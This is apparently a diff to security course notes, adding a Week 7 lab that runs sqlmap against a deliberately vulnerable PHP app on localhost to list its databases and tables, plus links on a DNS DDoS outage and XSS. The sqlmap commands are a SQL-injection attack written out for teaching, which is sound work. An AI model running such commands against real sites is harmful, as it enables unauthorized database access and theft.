@@ -1,4 +1,17 @@
-<br>1 . [SQLmap](http://www.binarytides.com/sqlmap-hacking-tutorial/)
+#Week 7
+ <br>1 . [DNS DDOS Attack]((http://www.independent.co.uk/life-style/gadgets-and-tech/news/netflix-twitter-internet-down-not-working-broken-paypal-ebay-facebook-instagram-a7374506.html)
+<br>2 . [SQLmap](http://www.binarytides.com/sqlmap-hacking-tutorial/)
+```
+git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cp -r /home/share/phpcrud/sqli/ .
+cd sqli
+gedit customers.sql #change ged to your username
+php -S localhost:8??? #run in another terminal
+cd ../sqlmap-dev
+python sqlmap.py -u "http://localhost:8???/read.php?id=1" 
+python sqlmap.py -u "http://localhost:8???/read.php?id=1" --dbs
+python sqlmap.py -u "http://localhost:8???/read.php?id=1" --tables -D rab
+```
 #Week 6
 <br>1 . [XSS Example](https://en.wikipedia.org/wiki/Samy_(computer_worm))
 <br>2 . [XSS Tutorial](http://excess-xss.com/)
